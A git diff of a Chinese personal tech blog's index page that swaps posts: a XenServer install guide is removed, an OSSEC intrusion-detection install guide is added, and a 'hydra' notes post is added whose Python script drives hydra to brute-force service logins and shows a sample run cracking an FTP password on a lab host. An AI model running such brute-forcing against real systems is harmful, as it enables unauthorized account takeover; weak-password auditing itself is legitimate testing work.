@@ -184,106 +184,6 @@ var _hmt = _hmt || [];
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-Xen-Server安装教程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/virtualization/Xen-Server安装教程/">Xen Server安装教程</a>
-    </h1>
-  
-
-        
-        <a href="/virtualization/Xen-Server安装教程/" class="archive-article-date">
-  	<time datetime="2017-03-20T10:14:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-20</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>安装环境VMware<br>首先下载 <a href="http://downloadns.citrix.com.edgesuite.net/11616/XenServer-7.0.0-main.iso" target="_blank" rel="external">IOS安装包</a></p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">配置信息如下</div></pre></td></tr></table></figure>
-<p><img src="https://leanote.com/api/file/getImage?fileId=58155fa5ab644162e1003f1d" alt="配置信息"></p>
-<h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">键盘选项默认，点OK继续</div></pre></td></tr></table></figure>
-<p>![<a href="https://leanote.com/api/file/getImage?fileId=58155fa5ab644162e1003f19" target="_blank" rel="external">键盘</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">保持默认</div></pre></td></tr></table></figure></p>
-<p><img src="https://leanote.com/api/file/getImage?fileId=58155fa5ab644162e1003f1c" alt="保持默认"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">accept 用户许可协议</div></pre></td></tr></table></figure></p>
-<p><img src="https://leanote.com/api/file/getImage?fileId=58155fa5ab644164d4003d28" alt="accept EULA"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">磁盘信息</div></pre></td></tr></table></figure></p>
-<blockquote>
-<p>默认虚拟存储为sda，点OK继续：</p>
-</blockquote>
-<p><img src="https://leanote.com/api/file/getImage?fileId=58155fa5ab644164d4003d27" alt="磁盘信息"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">使用本地介质安装</div></pre></td></tr></table></figure></p>
-<p><img src="https://leanote.com/api/file/getImage?fileId=58155fa5ab644162e1003f1a" alt="使用本地介质安装"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">不安装增强包</div></pre></td></tr></table></figure></p>
-<p><img src="https://leanote.com/api/file/getImage?fileId=58155fa5ab644164d4003d25" alt="不安装增强包"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">跳过测试</div></pre></td></tr></table></figure></p>
-<p><img src="https://leanote.com/api/file/getImage?fileId=581560c4ab644162e1003f33" alt="跳过测试"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root密码</div></pre></td></tr></table></figure></p>
-<p><img src="https://leanote.com/api/file/getImage?fileId=581560daab644164d4003d4d" alt="root密码"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">网络设置</div></pre></td></tr></table></figure></p>
-<blockquote>
-<p>测试使用，我就用DHCP了……</p>
-</blockquote>
-<p><img src="https://leanote.com/api/file/getImage?fileId=58155fa5ab644162e1003f1b" alt="图片标题"><br><img src="https://leanote.com/api/file/getImage?fileId=58155fa5ab644164d4003d26" alt="图片标题"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">时区设置</div><div class="line">asia</div><div class="line">shagnhai</div></pre></td></tr></table></figure>
-<p><img src="https://leanote.com/api/file/getImage?fileId=58156109ab644162e1003f36" alt="时区设置"><br><img src="https://leanote.com/api/file/getImage?fileId=58156120ab644162e1003f3a" alt="时区设置"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">时间服务器</div></pre></td></tr></table></figure></p>
-<p><img src="https://leanote.com/api/file/getImage?fileId=58156134ab644162e1003f3e" alt="时间服务器"></p>
-<p><img src="https://leanote.com/api/file/getImage?fileId=5815613fab644162e1003f3f" alt="时间服务器"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">开始安装</div></pre></td></tr></table></figure></p>
-<p><img src="https://leanote.com/api/file/getImage?fileId=5815614fab644162e1003f44" alt="开始安装"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">安装完成</div></pre></td></tr></table></figure>
-<p><img src="https://leanote.com/api/file/getImage?fileId=58156196ab644164d4003d62" alt="安装完成"><br><img src="https://leanote.com/api/file/getImage?fileId=5815619eab644164d4003d63" alt="用户登录"><br><img src="https://leanote.com/api/file/getImage?fileId=581561a7ab644162e1003f48" alt="Web端显示"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">虚拟化</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/virtualization/" class="article-tag-list-link color5">virtualization</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/virtualization/Xen-Server安装教程/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
     <article id="post-TensorFlow环境搭建" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -796,6 +696,92 @@ var _hmt = _hmt || [];
 
 
   
+    <article id="post-hydra-折腾笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/sec/hydra-折腾笔记/">hydra 折腾笔记</a>
+    </h1>
+  
+
+        
+        <a href="/sec/hydra-折腾笔记/" class="archive-article-date">
+  	<time datetime="2016-09-20T10:18:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-09-20</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">output =subprocess.Popen(<span class="string">"hydra -l ftp -P wooyun.txt 192.168.1.20 ftp"</span>, shell=True,stdout=subprocess.PIPE).communicate()[0]</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">In [62]: &apos;successfully&apos; in output</div><div class="line"></div><div class="line">Out[62]: True</div></pre></td></tr></table></figure>
+<h1 id="相关文档"><a href="#相关文档" class="headerlink" title="相关文档"></a>相关文档</h1><blockquote>
+<p><a href="http://www.cnblogs.com/mchina/archive/2013/01/01/2840815.html" target="_blank" rel="external">http://www.cnblogs.com/mchina/archive/2013/01/01/2840815.html</a></p>
+</blockquote>
+<h1 id="备选方案"><a href="#备选方案" class="headerlink" title="备选方案"></a>备选方案</h1><blockquote>
+<p>全能暴力破解测试工具——Patator v0.5<br><a href="https://github.com/lanjelot/patator" target="_blank" rel="external">https://github.com/lanjelot/patator</a></p>
+</blockquote>
+<h1 id="python-捕获-shell-脚本的输出结果"><a href="#python-捕获-shell-脚本的输出结果" class="headerlink" title="python 捕获 shell 脚本的输出结果"></a>python 捕获 shell 脚本的输出结果</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line">output =Popen([<span class="string">"mycmd"</span>,<span class="string">"myarg"</span>], stdout=PIPE).communicate()[<span class="number">0</span>]</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line">p = subprocess.Popen([<span class="string">'ls'</span>,<span class="string">'-a'</span>], stdout=subprocess.PIPE, stderr=subprocess.PIPE)</div><div class="line">out, err = p.communicate()</div><div class="line"><span class="keyword">print</span> out</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># work on Unix/Linux only</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> commands</div><div class="line"><span class="keyword">print</span> commands.getstatusoutput(<span class="string">'wc -l file'</span>)[<span class="number">1</span>]</div></pre></td></tr></table></figure>
+<h1 id="Demo-Py-hydra"><a href="#Demo-Py-hydra" class="headerlink" title="[Demo] Py-hydra"></a>[Demo] Py-hydra</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">通过Python操作Hydra进行相关服务弱口令扫描</div><div class="line">相关结果以json的形式返回</div><div class="line">'''</div><div class="line"></div><div class="line">__author__ = <span class="string">"SanNa"</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> signal</div><div class="line"></div><div class="line"><span class="comment"># 设置超时时间</span></div><div class="line">TIME_OUT = <span class="number">20</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_hydra</span><span class="params">(ip, service, username, password)</span>:</span></div><div class="line">    <span class="string">'''调用hydra进行破解</span></div><div class="line"></div><div class="line">    :param ip: 目标ip</div><div class="line">    :param service: 服务类型</div><div class="line">    :param username: 用户字典</div><div class="line">    :param password: 密码字典</div><div class="line"></div><div class="line">    :return str</div><div class="line">    '''</div><div class="line">    kwargs = &#123;</div><div class="line">            <span class="string">'ip'</span>: ip,</div><div class="line">            <span class="string">'service'</span>: service,</div><div class="line">            <span class="string">'username'</span>: username,</div><div class="line">            <span class="string">'password'</span>: password,</div><div class="line">            &#125;</div><div class="line">    command_str = <span class="string">"hydra -L &#123;username&#125; -P &#123;password&#125; &#123;ip&#125; &#123;service&#125;"</span></div><div class="line">    result = subprocess.Popen(command_str.format(**kwargs),</div><div class="line">                    shell=<span class="keyword">True</span>, stdout=subprocess.PIPE).communicate()[<span class="number">0</span>]</div><div class="line">    <span class="keyword">return</span> result</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">return_json</span><span class="params">(result)</span>:</span></div><div class="line">    <span class="string">'''从扫描结果中提出相关信息</span></div><div class="line"></div><div class="line">    :param result: 扫描结果</div><div class="line"></div><div class="line">    :return json</div><div class="line">    '''</div><div class="line">    ok_flag = <span class="string">'target successfully completed'</span></div><div class="line">    fail_flag = <span class="string">'0 valid passwords found'</span></div><div class="line">    data = &#123;</div><div class="line">            <span class="string">'login'</span>: <span class="keyword">None</span>,</div><div class="line">            <span class="string">'password'</span>: <span class="keyword">None</span>,</div><div class="line">            &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ok_flag <span class="keyword">in</span> result:</div><div class="line">        data[<span class="string">'status'</span>]  =  <span class="string">'success'</span></div><div class="line">        item = result.split(<span class="string">'\n'</span>)[<span class="number">5</span>]</div><div class="line">        data[<span class="string">'login'</span>] = item.split(<span class="string">' '</span>)[<span class="number">6</span>]</div><div class="line">        data[<span class="string">'password'</span>] = item.split(<span class="string">' '</span>)[<span class="number">10</span>]</div><div class="line">    <span class="keyword">elif</span> fail_flag <span class="keyword">in</span> result:</div><div class="line">        data[<span class="string">'status'</span>] = <span class="string">'fail'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        data[<span class="string">'status'</span>] = <span class="string">'unknown error.'</span></div><div class="line">    <span class="keyword">return</span> json.dumps([data])</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler</span><span class="params">(signum, frame)</span>:</span></div><div class="line">    <span class="keyword">raise</span> AssertionError</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    ip = sys.argv[<span class="number">1</span>]</div><div class="line">    service = sys.argv[<span class="number">2</span>]</div><div class="line">    username = <span class="string">'username.txt'</span></div><div class="line">    password = <span class="string">'password.txt'</span></div><div class="line">    <span class="comment"># try:</span></div><div class="line">    <span class="comment">#     username = sys.argv[3]</span></div><div class="line">    <span class="comment"># except:</span></div><div class="line">    <span class="comment">#     username = 'ftp'</span></div><div class="line">    <span class="comment"># try:</span></div><div class="line">    <span class="comment">#     password = sys.argv[4]</span></div><div class="line">    <span class="comment"># except:</span></div><div class="line">    <span class="comment">#     password = 'ftp'</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'[*] Place wait...'</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="comment"># 超时设置</span></div><div class="line">        signal.signal(signal.SIGALRM, handler)</div><div class="line">        signal.alarm(TIME_OUT)</div><div class="line"></div><div class="line">        result = start_hydra(ip, service, username, password)</div><div class="line">        <span class="keyword">print</span> result</div><div class="line">        data = return_json(result)</div><div class="line">    <span class="keyword">except</span> AssertionError:</div><div class="line">        <span class="keyword">print</span> <span class="string">"TIMEOUT!"</span></div></pre></td></tr></table></figure>
+<h1 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">➜  hydar  python test.py 192.168.1.55 ftp</div><div class="line">[*] Place wait...</div><div class="line">Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</div><div class="line"></div><div class="line">Hydra (http://www.thc.org/thc-hydra) starting at 2016-06-02 12:41:32</div><div class="line">[DATA] max 16 tasks per 1 server, overall 64 tasks, 22425 login tries (l:69/p:325), ~21 tries per task</div><div class="line">[DATA] attacking service ftp on port 21</div><div class="line">[21][ftp] host: 192.168.1.55   login: ftp   password: ftp</div><div class="line">1 of 1 target successfully completed, 1 valid password found</div><div class="line">Hydra (http://www.thc.org/thc-hydra) finished at 2016-06-02 12:41:37</div><div class="line"></div><div class="line">[&#123;&quot;status&quot;: &quot;success&quot;, &quot;login&quot;: &quot;ftp&quot;, &quot;password&quot;: &quot;ftp&quot;&#125;]</div></pre></td></tr></table></figure>
+<h1 id="备选方案-1"><a href="#备选方案-1" class="headerlink" title="备选方案"></a>备选方案</h1><blockquote>
+<p>全能暴力破解测试工具——Patator v0.5<br><a href="https://github.com/lanjelot/patator" target="_blank" rel="external">https://github.com/lanjelot/patator</a></p>
+</blockquote>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">hydra</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/sec/" class="article-tag-list-link color4">sec</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/sec/hydra-折腾笔记/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-MongoDB-开机自启动" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -958,6 +944,108 @@ var _hmt = _hmt || [];
       
         <p class="article-more-link">
           <a class="article-more-a" href="/devops/FreeRADIUS/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-Centos-6-6-Install-OSSEC" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/sec/Centos-6-6-Install-OSSEC/">Centos 6.6 Install OSSEC</a>
+    </h1>
+  
+
+        
+        <a href="/sec/Centos-6-6-Install-OSSEC/" class="archive-article-date">
+  	<time datetime="2016-08-20T10:22:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-08-20</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>OSSEC是一款开源的基于主机的入侵检测系统，可以简称为HIDS。它具备日志分析，文件完整性检查，策略监控，rootkit检测，实时报警以及联动响应等功能。它支持多种操作系统：Linux、Windows、MacOS、Solaris、HP-UX、AIX。属于企业安全之利器。</p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>CentOS 6.6</p>
+<h1 id="安装关联库和软件"><a href="#安装关联库和软件" class="headerlink" title="安装关联库和软件"></a>安装关联库和软件</h1><p>首先我们安装需要用到的关联库和软件，由于我们最终是需要把日志导入到MySQL中进行分析，以及需要通过web程序对报警结果进行展示，同时需要把本机当做SMTP，所以需要在本机安装MySQL、Apache和sendmail服务。在当前的终端中执行如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install wget gcc make mysql mysql-server mysql-devel httpd php php-mysql sendmail</div></pre></td></tr></table></figure></p>
+</blockquote>
+<h1 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@ossec-server ~]# /etc/init.d/httpd start</div><div class="line">[root@ossec-server ~]# /etc/init.d/mysqld start</div><div class="line">[root@ossec-server ~]# /etc/init.d/sendmail start</div></pre></td></tr></table></figure>
+<h2 id="Mysql相关配置"><a href="#Mysql相关配置" class="headerlink" title="Mysql相关配置"></a>Mysql相关配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[root@ossec-server ~]# mysql -uroot -p</div><div class="line">mysql&gt; create database ossec;</div><div class="line">mysql&gt; grant INSERT,SELECT,UPDATE,CREATE,DELETE,EXECUTE on ossec.* to ossec@localhost;</div><div class="line">mysql&gt; set password for ossec@localhost=PASSWORD(&apos;ossec&apos;);</div><div class="line">mysql&gt; flush privileges;</div><div class="line">mysql&gt; exit</div></pre></td></tr></table></figure>
+<h1 id="安装OSSEC服务端"><a href="#安装OSSEC服务端" class="headerlink" title="安装OSSEC服务端"></a>安装OSSEC服务端</h1><blockquote>
+<p>首先通过官网的链接下载当前的最新稳定版本 2.8.3 的服务端包，同时解压。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">wget https://akamai.bintray.com/87/87c7a1904d5c08c7cff3e42bd47c055b14b08faa?__gda__=exp=1465265745~hmac=3dacb2ddfc1c2aff8eeeff60f6c1ec8cbebf3dab98370b6894f3d87399be85ed&amp;response-content-disposition=attachment%3Bfilename%3D%22ossec-hids-2.8.3.tar.gz%22&amp;response-content-type=application%2Fgzip</div><div class="line"></div><div class="line">重命名文件</div><div class="line">mv 87c7a1904d5c08c7cff3e42bd47c055b14b08faa\?__gda__\=exp\=1465265745~hmac\=3dacb2ddfc1c2aff8eeeff60f6c1ec8cbebf3dab98370b6894f3d87399be85ed ossec.tar.gz</div><div class="line">解压</div><div class="line">[root@CentOS-6 ~]<span class="comment"># tar -zxf ossec.tar.gz</span></div><div class="line">[root@CentOS-6 ~]<span class="comment"># ls</span></div><div class="line">–                                         ossec-hids-2.8.3</div><div class="line">anaconda-ks.cfg                           ossec.tar.gz</div></pre></td></tr></table></figure>
+<blockquote>
+<p>为了使OSSEC支持MySQL，需要在安装前执行make setdb命令，如下</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[root@CentOS-6 ossec-hids-2.8.3]<span class="comment"># cd src</span></div><div class="line">[root@CentOS-6 src]<span class="comment"># ls</span></div><div class="line">addagent      error_messages    LOCATION      os_crypto    os_regex   syscheckd</div><div class="line">agentlessd    external          logcollector  os_csyslogd  os_xml     tests</div><div class="line">analysisd     headers           Makeall       os_dbd       os_zlib    util</div><div class="line">client-agent  init              Makefile      os_execd     remoted    VERSION</div><div class="line">config        InstallAgent.sh   monitord      os_maild     rootcheck  win32</div><div class="line">Config.Make   InstallServer.sh  os_auth       os_net       shared</div><div class="line">[root@CentOS-6 src]<span class="comment"># make setdb</span></div><div class="line">Info: Compiled with MySQL support.</div><div class="line">Info: Compiled with PostgreSQL support.</div><div class="line">[root@CentOS-6 src]<span class="comment"># cd ..</span></div></pre></td></tr></table></figure>
+<blockquote>
+<p>执行安装脚本</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">[root@CentOS-6 ossec-hids-2.8.3]# ./install.sh</div><div class="line">which: no host in (/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin)</div><div class="line"></div><div class="line">  ** Para instalação em português, escolha [br].</div><div class="line">  ** 要使用中文进行安装, 请选择 [cn].</div><div class="line">  ** Fur eine deutsche Installation wohlen Sie [de].</div><div class="line">  ** Για εγκατάσταση στα Ελληνικά, επιλέξτε [el].</div><div class="line">  ** For installation in English, choose [en].</div><div class="line">  ** Para instalar en Español , eliga [es].</div><div class="line">  ** Pour une installation en français, choisissez [fr]</div><div class="line">  ** A Magyar nyelvű telepítéshez válassza [hu].</div><div class="line">  ** Per l&apos;installazione in Italiano, scegli [it].</div><div class="line">  ** 日本語でインストールします．選択して下さい．[jp].</div><div class="line">  ** Voor installatie in het Nederlands, kies [nl].</div><div class="line">  ** Aby instalować w języku Polskim, wybierz [pl].</div><div class="line">  ** Для инструкций по установке на русском ,введите [ru].</div><div class="line">  ** Za instalaciju na srpskom, izaberi [sr].</div><div class="line">  ** Türkçe kurulum için seçin [tr].</div><div class="line">  (en/br/cn/de/el/es/fr/hu/it/jp/nl/pl/ru/sr/tr) [en]: cn</div><div class="line">which: no host in (/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin)</div></pre></td></tr></table></figure>
+<blockquote>
+<p>安装完成标识</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">感谢使用 OSSEC HIDS. 如果您有任何疑问,建议或您找到任何bug, 请通过　contact@ossec.net 或邮件列表 ossec-list@ossec.net 联系我们.</div><div class="line">( http://www.ossec.net/en/mailing_lists.html ).</div><div class="line"></div><div class="line">您可以在　http://www.ossec.net 获得更多信息</div><div class="line"></div><div class="line">--- 请按　ENTER 结束安装 (下面可能有更多信息). ---</div><div class="line"></div><div class="line">直到碰到上面内容，说明安装完成。</div></pre></td></tr></table></figure>
+<h1 id="配置服务端，使其工作正常"><a href="#配置服务端，使其工作正常" class="headerlink" title="配置服务端，使其工作正常"></a>配置服务端，使其工作正常</h1><blockquote>
+<p>执行下面命令启用数据库支持<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[root@CentOS-6 bin]# /var/ossec/bin/ossec-control enable database</div></pre></td></tr></table></figure></p>
+<p>导入MySQL表结构到MySQL中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[root@CentOS-6 bin]# mysql -uossec -p ossec &lt; ~/ossec-hids-2.8.3/src/os_dbd/mysql.schema</div></pre></td></tr></table></figure></p>
+<p>修改部分配置文件的权限，否则会启动服务失败：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[root@CentOS-6 etc]# chmod u+w /var/ossec/etc/ossec.conf</div></pre></td></tr></table></figure></p>
+<p>启动服务</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[root@CentOS-6 /]<span class="comment"># /etc/init.d/ossec-hids start</span></div><div class="line">Starting ossec-hids:                                       [确定]</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">OSSEC</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/sec/" class="article-tag-list-link color4">sec</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/sec/Centos-6-6-Install-OSSEC/">展开全文 >></a>
         </p>
       
 
@@ -1151,83 +1239,6 @@ var _hmt = _hmt || [];
 
 
   
-    <article id="post-Metasploit-MIDI文件解析远程代码执行" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/sec/Metasploit-MIDI文件解析远程代码执行/">Metasploit-MIDI文件解析远程代码执行</a>
-    </h1>
-  
-
-        
-        <a href="/sec/Metasploit-MIDI文件解析远程代码执行/" class="archive-article-date">
